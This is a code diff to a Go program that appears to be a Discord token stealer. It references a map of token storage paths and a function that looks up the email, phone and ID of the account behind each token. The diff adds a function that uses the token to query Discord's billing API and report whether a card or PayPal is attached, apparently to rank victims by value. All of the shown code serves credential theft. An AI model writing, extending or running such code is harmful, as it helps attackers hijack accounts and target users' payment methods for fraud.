@@ -4,6 +4,7 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"io"
 	"os"
 	"regexp"
 	"strings"
@@ -28,7 +29,6 @@ type Response struct {
 	DISCRIMINATOR string `json:"discriminator"`
 	EMAIL         string `json:"email"`
 	PHONE         string `json:"phone"`
-	MFA_ENABLED   bool   `json:"mfa_enabled"`
 }
 
 type Tokens struct {
@@ -38,7 +38,11 @@ type Tokens struct {
 	DISCRIMINATOR string `json:"discriminator"`
 	EMAIL         string `json:"email"`
 	PHONE         string `json:"phone"`
-	MFA_ENABLED   bool   `json:"mfa_enabled"`
+	BILLING       string `json:"billing"`
+}
+
+type Billing struct {
+	TYPE string `json:"type"`
 }
 
 var token_paths = map[string]string{
@@ -194,6 +198,49 @@ func GetTokenInfo(token string) Tokens {
 	user_id := response.ID
 	email := response.EMAIL
 	phone := response.PHONE
-	mfa := response.MFA_ENABLED
-	return Tokens{TOKEN: token, ID: user_id, USERNAME: username, EMAIL: email, PHONE: phone, MFA_ENABLED: mfa}
+	billing := getBilling(token)
+	return Tokens{TOKEN: token, ID: user_id, USERNAME: username, EMAIL: email, PHONE: phone, BILLING: billing}
+}
+
+func getBilling(token string) string {
+	client := http.Client{}
+	url := "https://discord.com/api/v6/users/@me/billing/payment-sources"
+	req, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		return "Error Checking Billing"
+	}
+	req.Header.Set("Authorization", token)
+	resp, err := client.Do(req)
+	if err != nil {
+		return "Error Checking Billing"
+	}
+	defer resp.Body.Close()
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		fmt.Println("Error reading response body:", err)
+		return "Error Checking Billing"
+	}
+	var billing []map[string]interface{}
+	err = json.Unmarshal(body, &billing)
+	if err != nil {
+		fmt.Println("Error parsing JSON:", err)
+		return "Error Checking Billing"
+	}
+	var paymentMethods []string
+	for _, method := range billing {
+		methodType := int(method["type"].(float64))
+		if methodType == 1 {
+			paymentMethods = append(paymentMethods, "Card")
+		} else if methodType == 2 {
+			paymentMethods = append(paymentMethods, "PayPal")
+		} else {
+			paymentMethods = append(paymentMethods, "Idk Lmao")
+		}
+	}
+	result := strings.Join(paymentMethods, ", ")
+
+	if result == "" {
+		return "No Billing Info"
+	}
+	return result
 }
